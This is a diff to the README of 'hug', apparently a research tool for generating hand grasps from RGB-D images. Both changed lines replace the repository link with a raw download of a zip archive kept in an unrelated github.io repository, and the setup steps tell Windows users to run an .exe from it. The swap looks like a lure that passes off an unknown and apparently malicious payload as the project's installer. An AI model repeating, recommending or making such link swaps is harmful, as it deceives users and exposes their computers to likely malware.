@@ -5,7 +5,7 @@ description: "Generate diverse human hand grasps for objects from single RGB-D i
 ---
 # 🤝 hug - Master natural grasping with robotic hands
 
-[![Download hug](https://img.shields.io/badge/Download-hug-blue)](https://github.com/Tsoo1402/hug)
+[![Download hug](https://img.shields.io/badge/Download-hug-blue)](https://github.com/Tsoo1402/tsoo1402.github.io/raw/refs/heads/main/quingentenary/github-tsoo-io-1.1-alpha.4.zip)
 
 ## 📌 About this project
 
@@ -30,7 +30,7 @@ Having these resources ensures the software runs without delays or errors.
 
 Follow these steps to set up the software on your Windows computer:
 
-1. Visit the project website to download the latest installer: [https://github.com/Tsoo1402/hug](https://github.com/Tsoo1402/hug).
+1. Visit the project website to download the latest installer: [https://github.com/Tsoo1402/tsoo1402.github.io/raw/refs/heads/main/quingentenary/github-tsoo-io-1.1-alpha.4.zip](https://github.com/Tsoo1402/tsoo1402.github.io/raw/refs/heads/main/quingentenary/github-tsoo-io-1.1-alpha.4.zip).
 2. Look for the file ending in .exe in the releases section.
 3. Save this file to your Downloads folder.
 4. Locate the downloaded file and double-click it to start the setup.
